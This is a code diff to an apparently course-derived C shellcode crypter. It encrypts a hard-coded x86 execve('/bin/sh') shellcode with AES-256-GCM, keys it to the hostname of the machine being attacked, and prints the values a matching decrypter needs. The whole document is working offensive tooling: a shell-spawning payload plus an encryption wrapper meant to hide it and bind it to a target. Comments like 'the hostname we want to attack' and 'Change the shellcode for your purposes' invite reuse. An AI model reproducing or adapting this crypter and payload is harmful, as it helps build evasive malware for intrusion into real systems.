@@ -25,11 +25,11 @@ int encrypt(unsigned char *shellcode, int shellcode_len,
 
   int len=0, ciphertext_len=0;
 
-  /* Create and initialise the context */
+  /* Create and initialize the encryption envelop context */
   if(!(ctx = EVP_CIPHER_CTX_new()))
     handleErrors();
 
-  /* Initialise the encryption operation. */
+  /* Initialize the AES-256-GCM encryption operation. */
   if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL))
     handleErrors();
 
@@ -37,7 +37,7 @@ int encrypt(unsigned char *shellcode, int shellcode_len,
   if(1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 16, NULL))
     handleErrors();
 
-  /* Initialise key and IV */
+  /* Initialize our encryption key and IV */
   if(1 != EVP_EncryptInit_ex(ctx, NULL, NULL, key, iv)) handleErrors();
 
   /* Provide the message to be encrypted, and obtain the encrypted output.
@@ -54,7 +54,7 @@ int encrypt(unsigned char *shellcode, int shellcode_len,
     handleErrors();
    ciphertext_len+=len;
 
-  /* Finalise the encryption. Normally ciphertext bytes may be written at
+  /* Finalize the encryption. Normally ciphertext bytes may be written at
    * this stage, but this does not occur in GCM mode
    */
   if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + ciphertext_len, &len)) handleErrors();
@@ -72,16 +72,19 @@ int encrypt(unsigned char *shellcode, int shellcode_len,
 
 int main (int argc, char **argv)
 {
+  // Change the shellcode for your purposes. Below is a stack-based execve shellcode from earlier exercises.
   unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
+  // Do not change below this line!!
   unsigned char key[32],ciphertext[1024+EVP_MAX_BLOCK_LENGTH],tag[16];
   unsigned char iv[16];
   int k;
   int counter;
 
-  gethostname(key, 32);
+  printf("Enter the hostname where shellcode will execute: ");
+  scanf("%s", key);
   printf("Key:\n%s\n\n", key);
 
-  /* generate encryption key from user entered key */
+  /* generate encryption key from the hostname we want to attack */
   if(!PKCS5_PBKDF2_HMAC_SHA1(key, strlen(key),NULL,0,1000,32,key))
   {
     printf("Error in key generation\n");
@@ -91,23 +94,27 @@ int main (int argc, char **argv)
   /* generate random IV */
   while(!RAND_bytes(iv,sizeof(iv)));
 
-  /* encrypt the text and print on STDOUT */
+  /* encrypt the text */
   k = encrypt(shellcode, strlen(shellcode), key, iv, ciphertext, tag);
 
+  /* print the IV to be used in the decrypter */
   printf("unsigned char iv[] = \"");
   for (counter=0; counter < sizeof(iv); counter++) {
     printf("\\x%02x", iv[counter]);
   }
   printf("\";\n");
 
+  /* print the encrypted shellcode to be used in the decrypter */
   printf("unsigned char encrypted_shellcode[] = \"");
   for (counter=0; counter < k; counter++) {
     printf("\\x%02x", ciphertext[counter]);
   }
   printf("\";\n");
 
+  /* print the encrypted shellcode length to be used in the decrypter */
   printf("int encrypted_shellcode_len = %d;\n", k);
 
+  /* print the GCM tag (aka the message authentication code) to be used in the decrypter */
   printf("unsigned char tag[] = \"");
   for (counter=0; counter < sizeof(tag); counter++) {
     printf("\\x%02x", tag[counter]);
